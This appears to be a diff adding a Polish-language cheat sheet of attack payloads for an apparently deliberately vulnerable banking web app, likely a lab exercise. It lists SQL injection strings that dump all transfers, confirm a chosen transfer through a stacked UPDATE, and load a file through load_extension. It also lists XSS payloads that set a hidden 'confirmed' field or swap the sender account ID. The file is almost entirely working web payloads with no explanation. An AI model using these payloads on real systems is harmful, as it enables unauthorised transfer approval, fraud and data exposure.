@@ -1,0 +1,15 @@
+SQL Injection:
+Wyświetl wszystkie przelewy:    1 OR 1=1 --
+Zatwierdź wybrany przelew:      1; UPDATE BankingApp_transfer SET confirmed=1 WHERE id=<id_przelewu> --
+Załaduj plik:   1 UNION ALL SELECT 1,2,3,4,5,6,load_extension('<file_path>')-- (brak autoryzacji)
+
+XSS:
+Potwierdzenie wysyłanego przelewu:
+<b onmouseover=alert(document.getElementById("confirmed").value=1)>click me!</b>
+<img src="http://url.to.file.which/not.exist" onerror=alert(document.getElementById("confirmed").value=1);>
+<body onload=alert(document.getElementById("confirmed").value=1)>
+
+Realizacja od innej osoby:
+<b onmouseover=alert(document.getElementById("sender").value=66639)>click me!</b>
+<img src="http://url.to.file.which/not.exist" onerror=alert(document.getElementById("sender").value=66639);>
+<body onload=alert(document.getElementById("sender").value=66639)>
